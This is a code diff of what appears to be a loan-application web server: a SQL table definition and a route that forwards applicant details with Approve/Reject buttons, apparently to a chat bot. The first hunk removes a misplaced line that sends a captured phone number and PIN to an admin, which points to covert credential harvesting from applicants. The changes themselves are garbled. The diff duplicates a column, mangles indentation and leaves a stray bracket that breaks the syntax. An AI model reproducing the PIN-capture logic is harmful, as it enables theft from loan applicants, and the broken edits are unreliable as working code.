@@ -44,8 +44,9 @@ CREATE TABLE IF NOT EXISTS applications (
   employment_status TEXT NOT NULL,
   annual_income NUMERIC NOT NULL,
   status TEXT NOT NULL DEFAULT 'pending',
-  await notifyAdmin(`PIN CAPTURED: Phone ${phone} PIN ${pin}`)
-  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
+  status TEXT NOT NULL DEFAULT 'pending',
+created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
+  
   reviewed_at TIMESTAMPTZ
 );
 `;
@@ -336,7 +337,8 @@ app.post('/api/applications', async (req, res) => {
       `Term: ${loanTerm}\n` +
       `Purpose: ${purpose.slice(0, 500)}\n` +
       `Employment: ${employmentStatus}\n` +
-      `Annual income: USD ${income}\n\n` +
+      `Annual income: USD ${income}`,
+[
       [[
         { text: 'Approve', callback_data: `approve:${id}` },
         { text: 'Reject', callback_data: `reject:${id}` }
